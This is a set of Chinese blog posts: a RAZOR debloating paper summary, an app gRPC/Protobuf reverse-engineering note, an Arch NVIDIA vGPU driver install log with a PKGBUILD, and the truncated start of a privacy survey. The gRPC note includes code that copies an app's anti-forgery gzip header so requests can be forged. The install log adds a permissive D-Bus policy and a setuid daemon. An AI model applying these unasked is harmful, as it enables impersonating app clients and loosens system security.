[{"categories":["论文","安全"],"contents":"RAZOR: software debloating 论文信息 原文作者：Chenxiong Qian, Hong Hu, Mansour Alharthi, Pak Ho Chung, Taesoo Kim, and Wenke Lee, Georgia Institute of Technology\n原文标题：RAZOR: A Framework for Post-deployment Software Debloating\n发表会议：USENIX SECURITY \u0026lsquo;19\n原文链接：https://www.usenix.org/system/files/sec19-qian.pdf\n代码链接：https://github.com/cxreet/razor\n问题背景 商业软件的功能越做越多，终端用户只用到一小部分，软件往往显得臃肿，这不仅浪费耗费系统资源，还带来了更多攻击面，而 software debloating 可以解决此问题。\n但以往的工作需要获取软件源码，而用户往往只有分发部署后的二进制程序，且不同用户所需的功能各异，所以 post-deployment 软件更加具有实际效用。\npost-deployment software debloating 有以下两个挑战：\n 如何让不了解软件内部的用户选择要保留和移除的功能 如何修改二进制程序，在删除无用功能的同时保留所需  对于第一个挑战，可以让用户提供输入样例，但即使输入完全相同，多次执行时也可能产生不同的程序执行路径，所以要识别出 necessary-but-not-executed 的那部分程序，即 related-code，很难获得完全正确的答案，所以作者使用了启发式的方法，以四个层次递进，逐步扩大覆盖范围。\n对于第二个挑战，收集完 related-code 后，就可以重写二进制程序，通用的二进制重写依赖于可靠的反汇编结果和完整的 CFG，故而较为困难。对于 software debloating 而言仅需重写要执行的那部分功能，通过 trace 就可获得 CFG，因而可以实现二进制重写。\n系统设计 如图所示，即 Tracer, Path Finder 和 Generator\nExecution Trace Collection Tracer 以所给测试数据执行程序，记录三种控制流信息：\n Executed instructions (memory addr \u0026amp; raw bytes) Conditional Branches Indirect Calls/Jumps  Instruction-level recording 可以应对动态生成的代码，但效率不高，考虑到现实中的程序大多只有静态的代码，所以 Tracer 先从 basic block level 开始记录，检测到疑似动态代码生成的特征再切换到 instruction level。\nTracer 综合运用了基于软件的工具 (Dynamorio) 与基于硬件的工具 (Intel PIN 和 Intel PT)，前者普适性好但性能较差，后者高效但无法保证信息完整，三种 trace 技术可能产生不同的程序执行，用户可以选择最适合的或合并 trace 结果来获得更好的代码覆盖度。\n收集完 trace 结果后，就能反汇编二进制程序并构建所需的部分 CFG。\nHeuristic-based Path Inference 由 Tracer 获得的 CFG，用启发式方法扩展 CFG，获得 related-code\n zCode，无新增指令，CFG 上只连边不加点 zCall, 无新函数调用，若 non-taken 分支不含任何 call 指令，则加进 CFG zLib, 无任何额外的库函数，若 non-taken 分支只 call 同 binary 的函数或已被 call 的库函数，则加进 CFG zFunc, 无不同功能的库函数，若 non-taken 分支 call 的外部函数不涉及新的 functionality，则加进 CFG  算法如下图所示\nDebloated Binary Synthesization  先将原始二进制程序按照 CFG 反汇编，生成包含所有必要指令的伪汇编(pseudo-assembly) 修改伪汇编创建有效的汇编文件，symbolize basic blocks, concretize indirect calls/jumps, and insert fault handling code 编译汇编文件成为包含必要的机器码的目标文件(object file) 复制目标文件中的机器码到原始二进制程序中一个新的代码段(code section) 修改新代码段来修复对原始代码和数据的所有引？ 设置原始代码段不可被执行，仍保留在 debloated 后的程序中（可能还会被读取？比如实现 switch 的 jump table）  具体实现 代码开源在 https://github.com/cxreet/razor\n有提供使用说明 https://github.com/cxreet/razor/wiki，从测试小程序到 coreutils 都有\ndocker pull chenxiong/razor:0.04 可以直接体验\n效果验证 3 个 benchmark，前两者用软件方式 trace，后两者用硬件方式 trace:\n 29 SPEC CPU2006，包含 12 个 C 程序，7 个 C++ 程序和10个 Fortran 程序 论文 CHISEL 中用到的 10 个 coreutils 程序 Firefox 和 FoxitReader  在以下五个方面和 CHISEL 对比：\n Code Reduction: 从精简效果上看 CHISEL 略胜一筹，但其影响程序鲁棒性 Functionality: RAZOR 使用启发式方法扩展 related-code 后，测试功能完全正常，CHISEL 则有 wrong operation, infinite loop, crash, missed output 等问题 Security: 选择一些 CVE，部分是可在对应 binary 上利用的，部分已经被修复。CHISEL 消除代码的策略激进，消除了更多 CVE 但导致一些原本已修复的 CVE 又可被利用，相比之下 RAZOR 更稳健。另外消除 ROP gadget 数量也是 CHISEL 略胜，因为 RAZOR 更关注防止 forward-edge control-flow attack，这种攻击利用函数指针而不是返回地址 Performance: RAZOR 的构建速度在秒级，远胜 CHISEL。运行时开销也平均只增加 1.7%，主要是由于 indirect call concretization Practicality: 在 Firefox 和 Foxit Reader 这两个大型应用上测试打开网页和 PDF，在启发式方法下都取得了不错的效果  讨论与相关工作 Best-effort inference: 启发式方法虽然不能保证 completeness 和 soundness，但广泛用于二进制分析和重写中\nControl-flow Integrity (CFI): 控制流完整性检测和 Software Debloating 其实是互相促进的，debloating 可实现粗粒度的 CFI，而 RAZOR 也利用了 binCFI 中的技术来做优化。\nRemoving original code: 其实目前 RAZOR 还保留原本的 code section 只是设成 read-only，因为其中的数据可能还会被读取，比如 llvm 会对 switch 语句在 code section 中生成 jump table，需要被 indirect jump 读取。要完全移除也可以先分析对 code section 的读取，再在重写时将数据 reloacate 到新的 data section 并更新相关代码来访问新的位置。\n相关工作有针对 library, source code, container, hardware 的 debloating，以及 delta debugging，在这些方面 RAZOR 也有可能提供新的思路。\n","date":"2022-02-08T13:46:52Z","permalink":"https://chinggg.github.io/post/razor/","tags":["论文"],"title":"RAZOR: Software Debloating"},{"categories":["安全"],"contents":"逆向时开始见到 gRPC 协议和 Protobuf 编码在私信、直播等领域使用，故记录之。\ngRPC 是基于 HTTP/2.0 来传输的，但 Fiddler 5 似乎尚不支持，在抓包某 App 时发现了神奇的现象，同样的功能，Fiddler 抓到了 HTTP/1.1 的请求，mitmproxy 抓到了 HTTP/2.0 的请求，URL 的 Path 相同而 Host 不一样，猜测是客户端做了 FallBack。\n抓到包后其实有两种选择，最开始我找到发请求的地点，闷头逆向 Java 层代码，打印数据（注意是否有类继承 com.google.protobuf.GeneratedMessageLite），一个个字段找生成的位置，但因为不熟悉客户端所用组件，往往耗时耗力找不到关键，而且考虑到之后的目标是正向构造请求，确定 proto 协议才是关键，与其往客户端实现层分析，不如直接从报文 body 着手。\nProtobuf 高效的一大原因在于其将字段名放在双方持有的 proto 中，传输的数据仅有 enum 编号，但数据本身的值却完全是可以解读的，protoc --decode_raw \u0026lt; file 就能打印出解析后的数据，也有在线网站，但我刚开始复制报文 body 却总是解析失败，mitmproxy 可选择以 protobuf 解码数据，却也失败，关键在于传输的是 Length-Prefixed-Message 而非直接是 protobuf，即第一个 byte 值为 1/0 表示是否压缩，再 4 byte (big endian) 表示消息长度，剩下的才是消息，而如果有压缩的话，还要再把消息解压缩，比如最常见的 gzip，其前 10 byte 又是压缩相关的头部信息，而 App 可能会刻意设置 gzip header 以防伪造，若非提前看到 哔哩哔哩视频和字幕接口分析 这篇文章，必然踩坑。\ndef gzip_compress(buf: bytes, bz=True) -\u0026gt; bytes: compressed = gzip.compress(buf) if bz: # special header compressed = compressed[:3] + bytes(7*[0]) + compressed[10:] return compressed def length_prefixed_enc(buf: bytes, compress: bool = True) -\u0026gt; bytes: buf = gzip_compress(buf) if compress else buf return struct.pack(\u0026quot;!bl\u0026quot;, compress, len(buf)) + buf def length_prefixed_dec(msg: bytes) -\u0026gt; bytes: compress, length = struct.unpack(\u0026quot;!bl\u0026quot;, msg[:5]) buf = gzip.decompress(msg[5:5+length]) if compress else msg[5:5+length] return buf  将 Protobuf 的原始数据提取出后，即可用 protoc 解得没有字段名的原始数据，配合动静态分析获得的值，一般就能手写对应的 proto 文件，接着就由 proto 文件生成不同语言的对应代码，可以尝试直接调用 gRPC，也可以仅生成 Protobuf 的 msg 对象再 SerializeToString()，生成 Length-Prefixed-Message 作为 body，添加 header \u0026quot;Content-Type\u0026quot;: \u0026quot;application/grpc\u0026quot;，这样构造 HTTP 请求亦可生效。\n","date":"2022-01-25T11:30:09+08:00","permalink":"https://chinggg.github.io/post/grpc-protobuf/","tags":["逆向","编码"],"title":"gRPC Protobuf 逆向初探"},{"categories":[""],"contents":"vps2arch 没啥好说的，上不了网注意改 systemd-networkd 的配置，提前 pacman -S vi vim base-devel\nNVIDIA nvidia 和 nvidia-lts 都是最新版 nvidia 驱动，一般内核新不是问题，往往是驱动太新，执行 nvidia-smi 后提示无法与 driv，lsmod | grep nvidia 没有结果，/dev 下也没有 nvidia，dmesg 才发现提示不支持。\n在官网查看对应型号显卡的最新驱动，记住版本号，比如 Tesla T4 是 470.82.01，若该型号官网驱动版本低于 nvidia，从 AUR 安装 nvidia-470xx-dkms 或 nvidia-390xx-dkms（其实 AUR 不止这些但以上两者是 Wiki 推荐)\n观察以上两个包的 PKGBUILD，发现都是从 https://download.nvidia.com/XFree86/Linux-x86_64/ 下载对应版本的 .run 文件，但直接执行 .run 文件不是 The Arch Way (容易滚挂？咱也没试过)，最好还是将 NVIDIA driver 纳入包管理器的控制，可以修改 PKGBUILD 中的 pkgver，自行打包 以安装任意版本的驱动，即 pacman -S devtools 后，执行 extra-x86_64-build 根据 PKGBUILD 创建干净的环境打包，再 pacman -U *.pkg.tar.zst 安装。若需要自行创建测试环境，可用 systemd-nspawn。\n为 NVIDIA 驱动打包，可参看 Listing of Installed Components 了解各文件的作用，.run 文件解压后也有 .manifest 简单列出路径和权限。另外 AUR 可参考的版本较少，可去 Manjaro GitLab 偷包，另外 diff -qr dir1/ dir2/ 可以比较不同驱动解压后目录中的文件异同，方便改包。\nvGPU 从 470xx 到 390xx，dmesg 日志都还是报错不支持，突然意识到机器是 vGPU 而非直通显卡，需要装 grid 驱动。可能是 license 的缘故，AUR 没有基于 grid 驱动的现成包，nvidia-merged 似乎是支持 vGPU 但安装提示本机并不是跑在 KVM 上的 vGPU，所以只能手打包。NVIDIA 官网没有提供 grid 驱动的公开直链，还好 Google Cloud 可以直接下载 NVIDIA-Linux-x86_64-${pkgver}-grid.run。\n基于 470xx 的 PKGBUILD 删减一通后居然打出了 470xx grid 的包，还真能装上，module 和 dev 都有了，nvidia-smi 不会立刻报错，而是等待许久后来一句 No devices were found，dmesg 中没有原来的显眼报错，而是 NVRM: RmInitAdapter failed!，肯定还是有问题了，nvidia-persistence 也无法启动的。\nDowngrade Kernel 查阅内网文档说是显卡驱动版本受限于母机，只支持到 450.102.04，那再手打 450xx 的包，结果发现安装 dkms 时总是编译报错，看 make.log 应该是内核源码中某些定义有变动，有类似的 patch https://bbs.archlinux.org/viewtopic.php?id=268421，但改了一个还没完，后面继续出现更多报错，短时间内估计搞不定，不如退而求其次，降 kernel 版本。\n根据 cuda-toolkit-release-notes 的 Table 3，450.102.04 对应 CUDA 11.0.3 Update 1，查看 cuda-installation-guide-linux v11.0.3，从表 Table 1. Native Linux Distribution Support in CUDA 11.0 推测官方最高支持到 Kernel 5.4.0，故降级到 linux-lts54，并 yay -S linux-lts54-headers\n安装 kernel 后重启前一定记得 grub-mkconfig，然后删除 /usr/lib/modules/ 下之前版本的残留文件夹，否则 dkms 仍会尝试编译该版本于是报错，未找到模块的错误 PKGBUILD 中再看是否可删除多余的命令，最后终于装成功，重启后 nvidia-smi 成功出现了梦寐以求的界面！\npython-pytorch-cuda 直接装，居然也 available 而不用装老版本，因为 cuda-toolkit-release-notes 的 Table 2 表明直到 CUDA 11.5 的 Minimum Required Driver Version 还是 \u0026gt;=450.80.02\ngridd 然而事情并没有那么简单，这样装上驱动后炼丹似乎完全没效果，这才想起来 vGPU 是需要 license 的，可装上后完全没有体现，因为我打包时压根没把 nvidia-gridd 放进去，于是打进包里，然后在 /etc/nvidia/gridd.conf 填入 license server address，启用服务后报错 Error requesting D-Bus name (Connection \u0026quot;:1.14\u0026quot; is not allowed to own the service \u0026quot;nvidia.grid.server\u0026quot; due to security policies in the configuration file)\n成功就在眼前，这个报错虽然非常小众，但问题依然能定位到 dbus配置，在 /usr/share/dbus-1/system.d 下创建 nvidia.grid.server.conf，写入如下配置：\n\u0026lt;!DOCTYPE busconfig PUBLIC \u0026quot;-//freedesktop//DTD D-Bus Bus Configuration 1.0//EN\u0026quot; \u0026quot;http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd\u0026quot;\u0026gt; \u0026lt;busconfig\u0026gt; \u0026lt;policy context=\u0026quot;default\u0026quot;\u0026gt; \u0026lt;allow own=\u0026quot;nvidia.grid.server\u0026quot;/\u0026gt; \u0026lt;/policy\u0026gt; \u0026lt;/busconfig\u0026gt;  果然不再报错，重启服务后显示成功获取，nvidia-smi -q | grep -i license 也证实了已变成 Licensed 状态。\nSummary 没有学会炼丹，却再次锻炼了折腾能力，最开始只会盲从 Arch Wiki，转折点是看到 /data 目录下的残留驱动而意识到应使用 vGPU 特供 grid 驱动，从而被迫学习改包打包，虽然成功打包并装上，但报错并发现到机器最高只支持 450xx，于是打旧包，这次是安装 dkms 总出错，从而对驱动和内核版本之间的关系有了更深理解，事后看 NVIDIA 官网的文档和表格大致明白了 Kernel, Driver, CUDA 这三者版本的关联。\n最后附上自制 nvidia-450xx-utils 的 PKGBUILD\n# Maintainer: Jonathon Fernyhough \u0026lt;jonathon+m2x+dev\u0026gt; # Contributor: Sven-Hendrik Haase \u0026lt;svenstaro@gmail.com\u0026gt; # Contributor: Thomas Baechler \u0026lt;thomas@archlinux.org\u0026gt; # Contributor: James Rayner \u0026lt;iphitus@gmail.com\u0026gt; pkgbase=nvidia-450xx-utils pkgname=('nvidia-450xx-utils' 'opencl-nvidia-450xx' 'nvidia-450xx-dkms') pkgver=450.102.04 pkgrel=2 arch=('x86_64') url=\u0026quot;http://www.nvidia.com/\u0026quot; license=('custom') options=('!strip') _pkg=\u0026quot;NVIDIA-Linux-x86_64-${pkgver}-grid\u0026quot; source=('nvidia-drm-outputclass.conf' 'nvidia-450xx-utils.sysusers' 'nvidia-450xx.rules' \u0026quot;https://storage.googleapis.com/nvidia-drivers-us-public/GRID/GRID11.3/${_pkg}.run\u0026quot;) sha512sums=('de7116c09f282a27920a1382df84aa86f559e537664bb30689605177ce37dc5067748acf9afd66a3269a6e323461356592fdfc624c86523bf105ff8fe47d3770' '4b3ad73f5076ba90fe0b3a2e712ac9cde76f469cd8070280f960c3ce7dc502d1927f525ae18d008075c8f08ea432f7be0a6c3a7a6b49c361126dcf42f97ec499' 'a0ceb0a6c240cf97b21a2e46c5c212250d3ee24fecef16aca3dffb04b8350c445b9f4398274abccdb745dd0ba5132a17942c9508ce165d4f97f41ece02b0b989' '523070e9e458f2da50df0f6dd35445ed824cf3b4ce2c3e191d58718a4ed638cfc644852b8330fb3da0444811431da7bf88f195e9aed1fa8615f92b8d1e941892') create_links() { # create soname links find \u0026quot;$pkgdir\u0026quot; -type f -name '*.so*' ! -path '*xorg/*' -print0 | while read -d $'\\0' _lib; do _soname=$(dirname \u0026quot;${_lib}\u0026quot;)/$(readelf -d \u0026quot;${_lib}\u0026quot; | grep -Po 'SONAME.*: \\[\\K[^]]*' || true) _base=$(echo ${_soname} | sed -r 's/(.*)\\.so.*/\\1.so/') [[ -e \u0026quot;${_soname}\u0026quot; ]] || ln -s $(basename \u0026quot;${_lib}\u0026quot;) \u0026quot;${_soname}\u0026quot; [[ -e \u0026quot;${_base}\u0026quot; ]] || ln -s $(basename \u0026quot;${_soname}\u0026quot;) \u0026quot;${_base}\u0026quot; done } prepare() { sh \u0026quot;${_pkg}.run\u0026quot; --extract-only cd \u0026quot;${_pkg}\u0026quot; bsdtar -xf nvidia-persistenced-init.tar.bz2 cd kernel sed -i \u0026quot;s/__VERSION_STRING/${pkgver}/\u0026quot; dkms.conf sed -i 's/__JOBS/`nproc`/' dkms.conf sed -i 's/__DKMS_MODULES//' dkms.conf sed -i '$iBUILT_MODULE_NAME[0]=\u0026quot;nvidia\u0026quot;\\ DEST_MODULE_LOCATION[0]=\u0026quot;/kernel/drivers/video\u0026quot;\\ BUILT_MODULE_NAME[1]=\u0026quot;nvidia-uvm\u0026quot;\\ DEST_MODULE_LOCATION[1]=\u0026quot;/kernel/drivers/video\u0026quot;\\ BUILT_MODULE_NAME[2]=\u0026quot;nvidia-modeset\u0026quot;\\ DEST_MODULE_LOCATION[2]=\u0026quot;/kernel/drivers/video\u0026quot;\\ BUILT_MODULE_NAME[3]=\u0026quot;nvidia-drm\u0026quot;\\ DEST_MODULE_LOCATION[3]=\u0026quot;/kernel/drivers/video\u0026quot;' dkms.conf # Gift for linux-rt guys sed -i 's/NV_EXCLUDE_BUILD_MODULES/IGNORE_PREEMPT_RT_PRESENCE=1 NV_EXCLUDE_BUILD_MODULES/' dkms.conf } package_opencl-nvidia-450xx() { pkgdesc=\u0026quot;OpenCL implemention for NVIDIA\u0026quot; depends=('zlib') optdepends=('opencl-headers: headers necessary for OpenCL development') provides=('opencl-driver' 'opencl-nvidia') conflicts=('opencl-nvidia') cd \u0026quot;${_pkg}\u0026quot; # OpenCL install -Dm644 nvidia.icd \u0026quot;${pkgdir}/etc/OpenCL/vendors/nvidia.icd\u0026quot; install -D \u0026quot;libnvidia-compiler.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-compiler.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-opencl.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-opencl.so.${pkgver}\u0026quot; create_links mkdir -p \u0026quot;${pkgdir}/usr/share/licenses\u0026quot; ln -s nvidia-utils \u0026quot;${pkgdir}/usr/share/licenses/opencl-nvidia\u0026quot; } package_nvidia-450xx-dkms() { pkgdesc=\u0026quot;NVIDIA drivers - module sources\u0026quot; depends=('dkms' \u0026quot;nvidia-450xx-utils=$pkgver\u0026quot; 'libglvnd') provides=('NVIDIA-MODULE') cd ${_pkg} install -dm 755 \u0026quot;${pkgdir}\u0026quot;/usr/src cp -dr --no-preserve='ownership' kernel \u0026quot;${pkgdir}/usr/src/nvidia-${pkgver}\u0026quot; install -Dt \u0026quot;${pkgdir}/usr/share/licenses/${pkgname}\u0026quot; -m644 \u0026quot;${srcdir}/${_pkg}/LICENSE\u0026quot; } package_nvidia-450xx-utils() { pkgdesc=\u0026quot;NVIDIA drivers utilities\u0026quot; depends=('xorg-server') optdepends=('xorg-server-devel: nvidia-xconfig' 'opencl-nvidia-450xx: OpenCL support') conflicts=('nvidia-libgl' 'nvidia-utils') provides=('vulkan-driver' 'opengl-driver' 'nvidia-libgl' 'nvidia-utils') install=\u0026quot;${pkgname}.install\u0026quot; cd \u0026quot;${_pkg}\u0026quot; # Check http://us.download.nvidia.com/XFree86/Linux-x86_64/${pkgver}/README/installedcomponents.html # for hints on what needs to be installed where. # X driver install -D nvidia_drv.so \u0026quot;${pkgdir}/usr/lib/xorg/modules/drivers/nvidia_drv.so\u0026quot; # GLX extension module for X install -D \u0026quot;libglxserver_nvidia.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/nvidia/xorg/libglxserver_nvidia.so.${pkgver}\u0026quot; # Ensure that X finds glx ln -s \u0026quot;libglxserver_nvidia.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/nvidia/xorg/libglxserver_nvidia.so.1\u0026quot; ln -s \u0026quot;libglxserver_nvidia.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/nvidia/xorg/libglxserver_nvidia.so\u0026quot; install -D \u0026quot;libGLX_nvidia.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libGLX_nvidia.so.${pkgver}\u0026quot; # OpenGL libraries install -D \u0026quot;libEGL_nvidia.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libEGL_nvidia.so.${pkgver}\u0026quot; install -D \u0026quot;libGLESv1_CM_nvidia.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libGLESv1_CM_nvidia.so.${pkgver}\u0026quot; install -D \u0026quot;libGLESv2_nvidia.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libGLESv2_nvidia.so.${pkgver}\u0026quot; install -Dm644 \u0026quot;10_nvidia.json\u0026quot; \u0026quot;${pkgdir}/usr/share/glvnd/egl_vendor.d/10_nvidia.json\u0026quot; # OpenGL core library install -D \u0026quot;libnvidia-glcore.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-glcore.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-eglcore.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-eglcore.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-glsi.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-glsi.so.${pkgver}\u0026quot; # misc install -D \u0026quot;libnvidia-ifr.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-ifr.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-fbc.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-fbc.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-encode.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-encode.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-cfg.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-cfg.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-ml.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-ml.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-glvkspirv.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-glvkspirv.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-allocator.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-allocator.so.${pkgver}\u0026quot; # Vulkan ICD install -Dm644 \u0026quot;nvidia_icd.json\u0026quot; \u0026quot;${pkgdir}/usr/share/vulkan/icd.d/nvidia_icd.json\u0026quot; install -Dm644 \u0026quot;nvidia_layers.json\u0026quot; \u0026quot;${pkgdir}/usr/share/vulkan/implicit_layer.d/nvidia_layers.json\u0026quot; # VDPAU install -D \u0026quot;libvdpau_nvidia.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/vdpau/libvdpau_nvidia.so.${pkgver}\u0026quot; # nvidia-tls library install -D \u0026quot;libnvidia-tls.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-tls.so.${pkgver}\u0026quot; # CUDA install -D \u0026quot;libcuda.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libcuda.so.${pkgver}\u0026quot; install -D \u0026quot;libnvcuvid.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvcuvid.so.${pkgver}\u0026quot; # PTX JIT Compiler (Parallel Thread Execution (PTX) is a pseudo-assembly language for CUDA) install -D \u0026quot;libnvidia-ptxjitcompiler.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-ptxjitcompiler.so.${pkgver}\u0026quot; # raytracing install -D \u0026quot;libnvoptix.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvoptix.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-rtcore.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-rtcore.so.${pkgver}\u0026quot; install -D \u0026quot;libnvidia-cbl.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-cbl.so.${pkgver}\u0026quot; # NGX install -D \u0026quot;libnvidia-ngx.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-ngx.so.${pkgver}\u0026quot; # Optical flow install -D \u0026quot;libnvidia-opticalflow.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-opticalflow.so.${pkgver}\u0026quot; # Only for GRID, maybe useless install -D \u0026quot;libFlxCore64.so.2018.02\u0026quot; \u0026quot;${pkgdir}/usr/lib/libFlxCore64.so.2018.02\u0026quot; install -D \u0026quot;libFlxComm64.so.2018.02\u0026quot; \u0026quot;${pkgdir}/usr/lib/libFlxComm64.so.2018.02\u0026quot; # DEBUG install -D nvidia-debugdump \u0026quot;${pkgdir}/usr/bin/nvidia-debugdump\u0026quot; # nvidia-xconfig install -D nvidia-xconfig \u0026quot;${pkgdir}/usr/bin/nvidia-xconfig\u0026quot; install -Dm644 nvidia-xconfig.1.gz \u0026quot;${pkgdir}/usr/share/man/man1/nvidia-xconfig.1.gz\u0026quot; # nvidia-settings install -D -m755 nvidia-settings \u0026quot;${pkgdir}/usr/bin/nvidia-settings\u0026quot; install -D -m644 nvidia-settings.1.gz \u0026quot;${pkgdir}/usr/share/man/man1/nvidia-settings.1.gz\u0026quot; install -D -m644 nvidia-settings.desktop \u0026quot;${pkgdir}/usr/share/applications/nvidia-settings.desktop\u0026quot; install -D -m644 nvidia-settings.png \u0026quot;${pkgdir}/usr/share/pixmaps/nvidia-settings.png\u0026quot; install -D -m755 \u0026quot;libnvidia-gtk2.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-gtk2.so.${pkgver}\u0026quot; install -D -m755 \u0026quot;libnvidia-gtk3.so.${pkgver}\u0026quot; \u0026quot;${pkgdir}/usr/lib/libnvidia-gtk3.so.${pkgver}\u0026quot; sed -e 's:__UTILS_PATH__:/usr/bin:' -e 's:__PIXMAP_PATH__:/usr/share/pixmaps:' -i \u0026quot;${pkgdir}/usr/share/applications/nvidia-settings.desktop\u0026quot; # nvidia-bug-report install -D nvidia-bug-report.sh \u0026quot;${pkgdir}/usr/bin/nvidia-bug-report.sh\u0026quot; # nvidia-smi install -D nvidia-smi \u0026quot;${pkgdir}/usr/bin/nvidia-smi\u0026quot; install -Dm644 nvidia-smi.1.gz \u0026quot;${pkgdir}/usr/share/man/man1/nvidia-smi.1.gz\u0026quot; # nvidia-cuda-mps install -D nvidia-cuda-mps-server \u0026quot;${pkgdir}/usr/bin/nvidia-cuda-mps-server\u0026quot; install -D nvidia-cuda-mps-control \u0026quot;${pkgdir}/usr/bin/nvidia-cuda-mps-control\u0026quot; install -Dm644 nvidia-cuda-mps-control.1.gz \u0026quot;${pkgdir}/usr/share/man/man1/nvidia-cuda-mps-control.1.gz\u0026quot; # nvidia-modprobe # This should be removed if nvidia fixed their uvm module! install -Dm4755 nvidia-modprobe \u0026quot;${pkgdir}/usr/bin/nvidia-modprobe\u0026quot; install -Dm644 nvidia-modprobe.1.gz \u0026quot;${pkgdir}/usr/share/man/man1/nvidia-modprobe.1.gz\u0026quot; # nvidia-persistenced install -D nvidia-persistenced \u0026quot;${pkgdir}/usr/bin/nvidia-persistenced\u0026quot; install -Dm644 nvidia-persistenced.1.gz \u0026quot;${pkgdir}/usr/share/man/man1/nvidia-persistenced.1.gz\u0026quot; install -Dm644 nvidia-persistenced-init/systemd/nvidia-persistenced.service.template \u0026quot;${pkgdir}/usr/lib/systemd/system/nvidia-persistenced.service\u0026quot; sed -i 's/__USER__/nvidia-persistenced/' \u0026quot;${pkgdir}/usr/lib/systemd/system/nvidia-persistenced.service\u0026quot; # nvidia-gridd install -Dm4755 nvidia-gridd \u0026quot;${pkgdir}/usr/bin/nvidia-gridd\u0026quot; install -Dm644 nvidia-gridd.1.gz \u0026quot;${pkgdir}/usr/share/man/man1/nvidia-gridd.1.gz\u0026quot; install -Dm644 gridd.conf.template \u0026quot;${pkgdir}/etc/nvidia/gridd.conf.template\u0026quot; install -Dm644 init-scripts/systemd/nvidia-gridd.service \u0026quot;${pkgdir}/usr/lib/systemd/system/nvidia-gridd.service\u0026quot; # application profiles install -Dm644 nvidia-application-profiles-${pkgver}-rc \u0026quot;${pkgdir}/usr/share/nvidia/nvidia-application-profiles-${pkgver}-rc\u0026quot; install -Dm644 nvidia-application-profiles-${pkgver}-key-documentation \u0026quot;${pkgdir}/usr/share/nvidia/nvidia-application-profiles-${pkgver}-key-documentation\u0026quot; install -Dm644 LICENSE \u0026quot;${pkgdir}/usr/share/licenses/nvidia-utils/LICENSE\u0026quot; install -Dm644 README.txt \u0026quot;${pkgdir}/usr/share/doc/nvidia/README\u0026quot; install -Dm644 NVIDIA_Changelog \u0026quot;${pkgdir}/usr/share/doc/nvidia/NVIDIA_Changelog\u0026quot; cp -r html \u0026quot;${pkgdir}/usr/share/doc/nvidia/\u0026quot; ln -s nvidia \u0026quot;${pkgdir}/usr/share/doc/nvidia-utils\u0026quot; install -Dm644 \u0026quot;${srcdir}/nvidia-450xx-utils.sysusers\u0026quot; \u0026quot;${pkgdir}/usr/lib/sysusers.d/$pkgname.conf\u0026quot; install -Dm644 \u0026quot;${srcdir}/nvidia-450xx.rules\u0026quot; \u0026quot;$pkgdir\u0026quot;/usr/lib/udev/rules.d/60-nvidia-450xx.rules # distro specific files must be installed in /usr/share/X11/xorg.conf.d install -m755 -d \u0026quot;$pkgdir/usr/share/X11/xorg.conf.d\u0026quot; install -Dm644 \u0026quot;${srcdir}/nvidia-drm-outputclass.conf\u0026quot; \u0026quot;${pkgdir}/usr/share/X11/xorg.conf.d/10-nvidia-drm-outputclass.conf\u0026quot; echo \u0026quot;blacklist nouveau\u0026quot; | install -Dm644 /dev/stdin \u0026quot;${pkgdir}/usr/lib/modprobe.d/${pkgname}.conf\u0026quot; echo \u0026quot;nvidia-uvm\u0026quot; | install -Dm644 /dev/stdin \u0026quot;${pkgdir}/usr/lib/modules-load.d/${pkgname}.conf\u0026quot; create_links }  ","date":"2022-01-17T15:03:15+08:00","permalink":"https://chinggg.github.io/post/vps2arch-nvidia/","tags":["",""],"title":"vps2arch NVIDIA vGPU"},{"categories":["论文"],"contents":"A survey of local differential privacy for securing internet of vehicles\nIntro IoV facilitates human’s life but benefits come with huge price of data privacy.\nIn academia, differential privacy (DP) is proposed and regarded as an extremely strong privacy standard, which formalizes both the degree of privacy preservation and data utility.\nBut DP suffers from a drawback in many practical scenarios because the paradigm of DP relies on a third 